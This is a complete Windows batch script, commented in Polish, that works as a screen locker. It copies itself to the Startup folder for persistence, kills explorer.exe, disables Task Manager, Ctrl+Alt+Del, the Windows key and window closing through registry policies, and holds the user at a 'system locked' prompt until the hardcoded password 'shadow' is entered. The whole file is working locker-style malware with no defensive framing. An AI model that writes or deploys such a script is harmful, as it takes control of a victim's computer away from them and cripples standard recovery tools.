@echo off
title SYSTEM LOCKED
color 0f
cls

:: Sprawdź uprawnienia administratora
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Uruchom jako administrator!
    pause
    exit
)

:: Dodaj do autostartu
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\%~nx0" copy "%~f0" "%startup%\" >nul

:: WYŁĄCZ WSZYSTKO
:: Ukryj pasek zadań
taskkill /f /im explorer.exe >nul 2>&1

:: Wyłącz Menedżera zadań (Ctrl+Alt+Del)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1

:: Wyłącz Alt+F4 i przycisk zamknij
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1

:: Wyłącz klawisz Windows
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f >nul 2>&1

:: Wyłącz Ctrl+Alt+Del
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1

:: Ukryj kursor
powershell -command "[System.Console]::CursorVisible = $false" >nul 2>&1

:: Maksymalizuj okno
mode con cols=200 lines=60 >nul
powershell -command "$host.ui.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(200,60)" >nul 2>&1

:lock
cls
:: Wyśrodkowany tekst (czysty sposób)
for /l %%i in (1,1,25) do echo.
echo                                     ====================================
echo                                     =         SYSTEM ZABLOKOWANY       =
echo                                     ====================================
for /l %%i in (1,1,10) do echo.
echo                                     Wprowadz haslo aby odblokowac:
echo.
set /p "input=                                     "

if /i "%input%"=="shadow" (
    goto unlock
) else (
    cls
    echo.
    echo                                     Bledne haslo!
    timeout /t 2 >nul
    goto lock
)

:unlock
:: PRZYWRÓĆ WSZYSTKO
:: Przywróć pasek zadań
start explorer.exe >nul 2>&1

:: Przywróć Menedżera zadań
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul 2>&1

:: Przywróć Alt+F4
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /f >nul 2>&1

:: Przywróć klawisz Windows
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /f >nul 2>&1

:: Przywróć Ctrl+Alt+Del
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /f >nul 2>&1

:: Usuń z autostartu
if exist "%startup%\%~nx0" del "%startup%\%~nx0" >nul

:: Pokaż kursor
powershell -command "[System.Console]::CursorVisible = $true" >nul 2>&1

cls
echo.
echo.
echo                                     ====================================
echo                                     =         SYSTEM ODBLOKOWANY       =
echo                                     ====================================
echo.
timeout /t 3 >nul
exit